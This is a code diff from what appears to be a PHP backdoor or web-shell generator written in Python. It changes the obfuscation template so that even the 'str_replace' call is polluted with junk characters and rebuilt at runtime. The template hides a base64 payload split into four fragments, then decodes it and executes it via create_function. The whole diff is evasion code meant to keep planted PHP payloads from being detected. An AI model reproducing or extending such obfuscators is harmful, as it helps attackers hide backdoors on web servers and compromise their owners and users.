@@ -39,7 +39,7 @@ $%%PAY_VAR1%%="%%PAYLOAD1%%";
 $%%PAY_VAR2%%="%%PAYLOAD2%%";
 $%%PAY_VAR3%%="%%PAYLOAD3%%";
 $%%PAY_VAR4%%="%%PAYLOAD4%%";
-$%%REPL_FUNC%% = "str_replace";
+$%%REPL_FUNC%% = str_replace("%%REPL_POLLUTION%%","","%%REPL_ENCODED%%");
 $%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", "%%B64_ENCODED%%");
 $%%CREATFUNC%% = $%%REPL_FUNC%%("%%CREATFUNC_POLLUTION%%","","%%CREATFUNC_ENCODED%%");
 $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR1%%.$%%PAY_VAR2%%.$%%PAY_VAR3%%.$%%PAY_VAR4%%))); $%%FINALFUNC%%();
@@ -72,6 +72,8 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
 		
 		replace_new_func_name = random_string()
+		repl_pollution, repl_polluted = pollute_with_static_str('str_replace',frequency=0.7)
+		
 		final_func_name = random_string()
 		
 		length  = len(payload_polluted)
@@ -91,6 +93,9 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		template = template.replace( '%%CREATFUNC%%', createfunc_name )
 		template = template.replace( '%%CREATFUNC_ENCODED%%',  createfunc_polluted )
 		template = template.replace( '%%CREATFUNC_POLLUTION%%',  createfunc_pollution )
+		template = template.replace( '%%REPL_ENCODED%%',  repl_polluted )
+		template = template.replace( '%%REPL_POLLUTION%%',  repl_pollution )
+		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
 		template = template.replace( '%%PAY_VAR1%%', payload_var[0] )
 		template = template.replace( '%%PAY_VAR2%%', payload_var[1] )
 		template = template.replace( '%%PAY_VAR3%%', payload_var[2] )
@@ -101,9 +106,6 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		template = template.replace( '%%PAYLOAD2%%', payload_polluted[piece1:piece2] )
 		template = template.replace( '%%PAYLOAD3%%', payload_polluted[piece2:piece3] )
 		template = template.replace( '%%PAYLOAD4%%', payload_polluted[piece3:] )
-		
-		
-		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
 		template = template.replace( '%%FINALFUNC%%', final_func_name )
 		
 		
